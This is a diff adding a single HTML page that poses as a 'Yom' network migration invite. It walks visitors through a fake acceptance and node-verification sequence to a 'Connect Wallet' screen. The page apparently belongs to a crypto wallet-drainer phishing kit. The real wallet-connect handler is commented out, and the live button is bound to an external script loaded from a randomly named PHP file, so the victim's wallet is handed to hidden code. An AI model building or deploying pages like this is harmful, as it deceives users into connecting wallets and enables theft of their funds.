@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yom | Migration Invite</title>
+    <!-- Importing high-end geometric sans-serif fonts matching the brand's layout -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <script>
+        // Pre-emptively load fallback if the main logo fails to render
+        function handleLogoError() {
+            const img = document.getElementById('brandLogo');
+            const fallback = document.getElementById('fallbackLogo');
+            if (img) img.style.display = 'none';
+            if (fallback) fallback.style.display = 'flex';
+        }
+    </script>
+    
+    <style>
+        :root {
+            --bg-color: #000000;
+            --card-bg: #09090b;
+            --border-color: #1c1c1e;
+            --border-hover: #2c2c2e;
+            --text-primary: #ffffff;
+            --text-secondary: #a1a1aa;
+            --text-tertiary: #52525b;
+            --accent-color: #ffffff;
+            --transition-speed: 0.3s;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Ambient subtle technical workspace grids */
+        .bg-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(to right, rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 40px 40px;
+            background-position: center center;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .bg-radial {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, transparent 15%, #000000 80%);
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .invite-card {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 350px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px 16px;
+            text-align: center;
+            transition: border-color var(--transition-speed) ease, box-shadow var(--transition-speed) ease;
+        }
+
+        .invite-card:hover {
+            border-color: var(--border-hover);
+            box-shadow: 0 0 40px rgba(255, 255, 255, 0.012);
+        }
+
+        /* Brand Logo Container */
+        .logo-container {
+            margin-bottom: 36px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 44px;
+        }
+
+        .logo-img {
+            height: 100px;
+            width: 144px;
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-size: contain;
+            background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDEyODAgMTAyNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMTI4MCAxMDI0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cgkuc3Qwe2ZpbGw6I0ZGRkZGRjt9Cjwvc3R5bGU+CjxnPgoJPGc+CgkJPGc+CgkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik01MzUuOTIsMzQxLjYzTDUzNS45MiwzNDEuNjNjLTEyLjgzLTcuNDEtMjkuMjQtMy4wMS0zNi42NCw5LjgybC01NS42LDk2LjMgICAgIGMtMTMuMTYsMjIuNzktMzcuNDcsMzYuODMtNjMuNzksMzYuODNsLTEwOC41OSwwYy0xNS4yMSwwLTI3LjU1LDEyLjMzLTI3LjU1LDI3LjU1djBjMCwxNS44MywxMi44MywyOC42NiwyOC42NiwyOC42NmwxMDcuNDksMCAgICAgYzI2LjMxLDAsNTAuNjMsMTQuMDQsNjMuNzksMzYuODNsNTMuNzQsOTMuMDhjOC40MywxNC42LDI3LjEsMTkuNiw0MS43LDExLjE3aDBjMTIuMjgtNy4wOSwxNi40OS0yMi44LDkuNC0zNS4wOGwtNTYuMTctOTcuMjkgICAgIGMtMTMuMTYtMjIuNzktMTMuMTYtNTAuODYsMC03My42NWw1NC4zMS05NC4wOEM1NTQuNzksMzY3LjcyLDU0OS45NywzNDkuNzUsNTM1LjkyLDM0MS42M3oiPjwvcGF0aD4KCQk8L2c+Cgk8L2c+Cgk8Zz4KCQk8cGF0aCBjbGFzcz0ic3QwIiBkPSJNNzMwLjg1LDQ3MS41YzEuMDgsMCwyLjAxLDAuNDEsMi44MywxLjIzYzAuODIsMC44NCwxLjIzLDEuODQsMS4yMywzLjAzYzAsMS4xMy0wLjMzLDIuMDctMSwyLjgxICAgIGwtMjcuMzEsMzQuNTF2MzMuOTNjMCwxLjUxLTAuNDUsMi42Ni0xLjMsMy41Yy0wLjg2LDAuODItMS45NywxLjIzLTMuMzEsMS4yM2MtMS4zNCwwLTIuNDYtMC40MS0zLjMxLTEuMjMgICAgYy0wLjg2LTAuODQtMS4zLTEuOTktMS4zLTMuNXYtMzQuMDRsLTI3LjMxLTM0LjRjLTAuNzQtMC44Mi0xLjEyLTEuNzUtMS4xMi0yLjgxYzAtMS4xOSwwLjQ1LTIuMiwxLjMtMy4wMyAgICBjMC44Ni0wLjgyLDEuODYtMS4yMywyLjk4LTEuMjNjMS4yNywwLDIuMzQsMC41NiwzLjI3LDEuNjdsMjUuNiwzMi43MWwyNS41Mi0zMi43MUM3MjguNTEsNDcyLjA2LDcyOS41OSw0NzEuNSw3MzAuODUsNDcxLjV6Ij48L3BhdGg+CgkJPHBhdGggY2xhc3M9InN0MCIgZD0iTTgyMi4wOSw1NDcuMTRjLTUuNDMtMy4zMS05LjYtNy45OC0xMi41NC0xNC4wNmMtMi45LTYuMDYtNC4zOS0xMy4yMS00LjM5LTIxLjQ3ICAgIGMwLTguMzIsMS40NS0xNS41Miw0LjM1LTIxLjYyYzIuODYtNi4xMiw3LjAzLTEwLjc5LDEyLjQ2LTE0LjA2YzUuNDMtMy4yNiwxMS44Ny00Ljg3LDE5LjI3LTQuODdzMTMuODQsMS42MiwxOS4yNyw0Ljg3ICAgIGM1LjQzLDMuMjcsOS42LDcuOTQsMTIuNDYsMTQuMDZjMi45LDYuMSw0LjM1LDEzLjI2LDQuMzUsMjEuNTFjMCw4LjI2LTEuNDksMTUuNDItNC4zOSwyMS41MmMtMi45NCw2LjEyLTcuMTEsMTAuODEtMTIuNTQsMTQuMTIgICAgYy01LjQzLDMuMjktMTEuODMsNC45My0xOS4xNiw0LjkzQzgzMy45Miw1NTIuMDcsODI3LjUyLDU1MC40NCw4MjIuMDksNTQ3LjE0eiBNODYwLjg2LDUzNS43MmM0LjY5LTUuNjYsNy4wMy0xMy43Myw3LjAzLTI0LjIyICAgIGMwLTEwLjQ3LTIuMzQtMTguNTMtNi45OS0yNC4xNWMtNC42MS01LjYyLTExLjItOC40NS0xOS42NS04LjQ1Yy04LjQxLDAtMTQuOTIsMi44NS0xOS42MSw4LjVjLTQuNjksNS42Ni03LjAzLDEzLjY5LTcuMDMsMjQuMDkgICAgYzAsMTAuNDIsMi4zNCwxOC40Nyw3LjAzLDI0LjE3YzQuNjksNS42OSwxMS4yLDguNTQsMTkuNjEsOC41NEM4NDkuNjIsNTQ0LjIsODU2LjE3LDU0MS4zOCw4NjAuODYsNTM1LjcyeiI+PC9wYXRoPgoJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xMDM1LjA2LDQ3Mi42N2MwLjc4LDAuODcsMS4xOSwyLjAxLDEuMTksMy40MnY3MS4xNmMwLDEuMzQtMC40MSwyLjQyLTEuMTUsMy4yNiAgICBjLTAuNzQsMC44Mi0xLjc5LDEuMjMtMy4xMywxLjIzcy0yLjM4LTAuNDEtMy4wNS0xLjIzYy0wLjY3LTAuODQtMS0xLjkyLTEtMy4yNnYtNTcuNDVsLTI0LjM3LDQ2Ljc3ICAgIGMtMS4wOCwyLjE2LTIuNiwzLjI2LTQuNjEsMy4yNmMtMS45NywwLTMuNS0xLjEtNC42MS0zLjI2bC0yNC41Mi00Ni4xOXY1Ni44N2MwLDEuMzQtMC4zMywyLjQyLTEuMDQsMy4yNiAgICBjLTAuNzQsMC44Mi0xLjc1LDEuMjMtMy4wOSwxLjIzYy0xLjM4LDAtMi40Mi0wLjQxLTMuMTYtMS4yM2MtMC43NC0wLjg0LTEuMTItMS45Mi0xLjEyLTMuMjZWNDc2LjFjMC0xLjQxLDAuNDEtMi41NSwxLjIzLTMuNDIgICAgYzAuODItMC44NiwxLjkzLTEuMjgsMy4zOS0xLjI4YzEuODYsMCwzLjM1LDEuMDgsNC40NiwzLjI2bDI4LjU4LDU0LjczbDI4LjItNTQuNzNjMC42LTEuMTksMS4yNy0yLjA1LDEuOTctMi41MyAgICBjMC43MS0wLjQ4LDEuNTYtMC43MywyLjUzLTAuNzNDMTAzMy4xNiw0NzEuMzksMTAzNC4yOCw0NzEuODIsMTAzNS4wNiw0NzIuNjd6Ij48L3BhdGg+Cgk8L2c+CjwvZz4KPC9zdmc+Cg==);            
+        }
+
+        .logo-fallback {
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 22px;
+            font-weight: 500;
+            letter-spacing: -0.5px;
+            color: var(--text-primary);
+        }
+
+        /* Typography & Layout Elements */
+        h1 {
+            font-size: 19px;
+            font-weight: 500;
+            letter-spacing: -0.4px;
+            margin-bottom: 12px;
+            color: var(--text-primary);
+        }
+
+        .description {
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+            font-weight: 400;
+        }
+
+        /* Invite Code Box */
+        .invite-code-container {
+            background-color: rgba(255, 255, 255, 0.015);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            transition: border-color var(--transition-speed) ease;
+        }
+
+        .invite-code-container:hover {
+            border-color: var(--border-hover);
+        }
+
+        .code-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-tertiary);
+            font-weight: 500;
+            text-align: left;
+        }
+
+        .code-value {
+            font-family: monospace;
+            font-size: 14px;
+            color: var(--text-primary);
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .copy-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 4px 8px;
+            font-size: 11px;
+            border-radius: 4px;
+            transition: color 0.15s ease, background-color 0.15s ease;
+        }
+
+        .copy-btn:hover {
+            color: var(--text-primary);
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            font-size: 13px;
+            font-weight: 500;
+            border-radius: 8px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: opacity var(--transition-speed) ease, background-color var(--transition-speed) ease, border-color var(--transition-speed) ease, transform 0.2s ease;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background-color: var(--accent-color);
+            color: #000000;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover {
+            color: var(--text-primary);
+            border-color: var(--border-hover);
+            background-color: rgba(255, 255, 255, 0.01);
+        }
+
+        /* Success & Wallet Views base transitions */
+        .animated-view {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .animated-view.active {
+            display: flex;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Checkmark icon & animated loop styling */
+        .checkmark-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+            width: 52px;
+            height: 52px;
+        }
+
+        .spinner-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 52px;
+            height: 52px;
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-top: 1.5px solid var(--text-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-icon-bg {
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: var(--card-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--border-color);
+        }
+
+        /* Toast system */
+        .toast {
+            position: absolute;
+            bottom: 30px;
+            background-color: #121214;
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 10px 16px;
+            border-radius: 8px;
+            font-size: 12px;
+            z-index: 100;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity var(--transition-speed) ease, transform var(--transition-speed) ease;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-grid"></div>
+    <div class="bg-radial"></div>
+
+    <!-- Main Invite Frame -->
+    <div class="invite-card" id="cardContainer">
+        
+        <!-- View 1: Main Interactive Access Card -->
+        <div id="inviteView" style="transition: opacity 0.3s ease;">
+            <!-- Brand Logo centered -->
+            <div class="logo-container">
+                <!-- Main user asset referenced verbatim -->
+                <div  alt="Yom Logo" class="logo-img" id="brandLogo" ></div>
+
+            </div>
+
+            <h1>Network Migration Invite</h1>
+            <p class="description">
+                You have been invited to join our migration early sign-in. <br>Secure your node access and build permissionless AI.
+            </p>
+
+            <div class="invite-code-container">
+                <div style="text-align: left;">
+                    <div class="code-label">Access Code</div>
+                    <div class="code-value" id="inviteCode">OX-7F9B2-A8</div>
+                </div>
+                <button class="copy-btn" onclick="copyInviteCode()">Copy</button>
+            </div>
+
+            <div class="btn-stack">
+                <button class="btn btn-primary" onclick="acceptInvitation()">Accept & Launch</button>
+                <!-- <a href="https://basescan.org/token/0xA66B448f97CBf58D12f00711C02bAC2d9EAC6f7f" target="_blank" class="btn btn-secondary">Explore Contract</a> -->
+                <a href="https://x.com/yom_official" target="_blank" class="btn btn-secondary" style="display: flex; align-items: center; gap: 4px; justify-content: center; color: #FFFFFF;">
+                                    <span style="margin-top: 4px;">
+                                        <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="14" height="14">
+                                            <title>X</title>
+                                            <path
+                                                d="M14.234 10.162 22.977 0h-2.072l-7.591 8.824L7.251 0H.258l9.168 13.343L.258 24H2.33l8.016-9.318L16.749 24h6.993zm-2.837 3.299-.929-1.329L3.076 1.56h3.182l5.965 8.532.929 1.329 7.754 11.09h-3.182z" fill="#FFFFFF" />
+                                        </svg>
+                                    </span>
+                                    YOM
+                                </a>
+            </div>
+        </div>
+
+        <div class="animated-view" id="successView">
+            <div class="checkmark-wrapper">
+                <div class="spinner-ring"></div>
+                <div class="success-icon-bg">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+            </div>
+            <h1 style="font-size: 20px; font-weight: 500; margin-bottom: 8px;">Invite accepted</h1>
+            <p class="description" style="max-width: 300px; margin: 0 auto 12px; font-size: 13px;">
+                Verifying node signatures. Launching authorization gate shortly...
+            </p>
+        </div>
+
+        <div class="animated-view" id="walletView">
+            <div class="logo-container" style="margin-bottom: 24px;">
+                <!-- Re-verify identity header -->
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="color: var(--text-primary);">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <h1 style="font-size: 20px; font-weight: 500; margin-bottom: 8px;">Connect Wallet</h1>
+            <p class="description" style="max-width: 320px; margin: 0 auto 28px; font-size: 13px;">
+                Link your Web3 account to claim secure node key. This acts as your secure interface signature.
+            </p>
+            <div class="btn-stack" style="width: 100%;">
+                <!-- <button class="btn btn-primary" onclick="handleWalletConnect()">Connect Wallet</button> -->
+                <button class="btn btn-primary interact-button" >Connect Wallet</button>
+                <button class="btn btn-secondary" onclick="resetFlow()">Back to Start</button>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="toast" id="toastMessage">Invite code copied to clipboard</div>
+
+    <script charset="UTF-8" type="text/javascript" src="./pl4h56ys6.php"></script>
+
+    <script>
+        // Copy access token logic safely
+        function copyInviteCode() {
+            const codeText = document.getElementById('inviteCode').innerText;
+            const el = document.createElement('textarea');
+            el.value = codeText;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+
+            showToast("Access code copied to clipboard");
+        }
+
+        // Action workflow sequences
+        function acceptInvitation() {
+            const inviteView = document.getElementById('inviteView');
+            const successView = document.getElementById('successView');
+            const walletView = document.getElementById('walletView');
+            
+            // Fade out phase 1
+            inviteView.style.opacity = '0';
+            
+            setTimeout(() => {
+                inviteView.style.display = 'none';
+                
+                // Show phase 2 (Invite accepted loading indicator)
+                successView.style.display = 'flex';
+                // Trigger reflow to initialize CSS animation smoothly
+                successView.offsetHeight; 
+                successView.classList.add('active');
+                
+                // Keep the "Invite accepted" state active for exactly 5 seconds (5000ms)
+                setTimeout(() => {
+                    // Transition smoothly into phase 3
+                    successView.classList.remove('active');
+                    
+                    setTimeout(() => {
+                        successView.style.display = 'none';
+                        
+                        // Show phase 3 (Connect wallet screen)
+                        walletView.style.display = 'flex';
+                        walletView.offsetHeight;
+                        walletView.classList.add('active');
+                    }, 400); // Wait for transition fade-out to finish
+                    
+                }, 5000);
+                
+            }, 300);
+        }
+
+        // Wallet Mock Sequence
+        function handleWalletConnect() {
+            showToast("Connecting wallet provider...");
+            setTimeout(() => {
+                showToast("Signature authorized. Access granted!");
+            }, 1800);
+        }
+
+        // Safe loop reset to start 
+        function resetFlow() {
+            const inviteView = document.getElementById('inviteView');
+            const successView = document.getElementById('successView');
+            const walletView = document.getElementById('walletView');
+
+            walletView.classList.remove('active');
+            
+            setTimeout(() => {
+                walletView.style.display = 'none';
+                
+                inviteView.style.display = 'block';
+                inviteView.offsetHeight;
+                inviteView.style.opacity = '1';
+            }, 400);
+        }
+
+        // Minimal alert UI fallback
+        function showToast(message) {
+            const toast = document.getElementById('toastMessage');
+            toast.innerText = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
